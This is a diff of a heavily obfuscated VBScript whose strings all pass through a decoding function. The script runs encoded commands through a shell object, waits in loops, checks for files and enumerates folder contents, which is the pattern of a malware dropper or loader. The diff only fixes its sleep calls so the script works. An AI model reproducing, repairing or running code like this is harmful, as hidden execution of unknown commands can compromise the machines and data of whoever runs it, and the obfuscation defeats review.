@@ -100,7 +100,7 @@ ty2deBU.Close
 Set m8HW1e91 = CreateObject(ui6laMI("7$fMoIWY2h#_""f1j:$II'^K[=b~ba|"))
 m8HW1e91.CurrentDirectory = ui6laMI("e@#9%0[R3K}ih[~hpi)RZ3") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 m8HW1e91.Run gXVv5P43wz
-w.sleep 5000
+wscript.sleep 5000
 m8HW1e91.Run qf1vTN121
 pm4EuF0 = true
 do While (pm4EuF0 = true)
@@ -112,16 +112,16 @@ do While (pm4EuF0 = true)
             Exit For
         end if
     Next
-    W.Sleep 1000
+    wscript.sleep 1000
 Loop
 Set iHqs5U3 = CreateObject(ui6laMI("#kqI8Y8hu_Gf2jy_Yd7]0$j<u_+bO[7ILoqi5jL[vcFE+XG`I[$Yuj8V"))
-W.Sleep 60000
+wscript.sleep 60000
 o8sDhg0bM = ui6laMI("%SU920^RsK<iw[rh6iSR\a")+ gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + ui6laMI("Rpp-GpanuW8$`Zablb31")
 If iHqs5U3.FileExists(o8sDhg0bM) Then
     m8HW1e91.Run ui6laMI("#UdmG_VdFh/WVhx#""nL,E*L#_,|&e(0$c[bn>[BL")
 end if
 
-w.sleep 5000
+wscript.sleep 5000
 m8HW1e91.CurrentDirectory = ui6laMI("V7:9|0ZRrK@i1[%h^irR*y") + gGWMzvn + ui6laMI("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + ui6laMI("`f]Cp[yd8kQR<F_h3eW]_h,W?ctioRQIYjxWKhijpkLf6RNi")
 For Each of28Yc7r in zG1IH7kt.GetFolder(ui6laMI("F$Q9X0dRRK}iZ[\h&ieRVI") + gGWMzvn + ui6laMI("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + ui6laMI("GvCC&[wd""kIR}F*hses]lhDW$c[i-R!IWj""W2hEj(kpfyR^x")).Files
 if InStr(of28Yc7r,ui6laMI("'&,M<_CdBhxW&hi9")) > 0 then
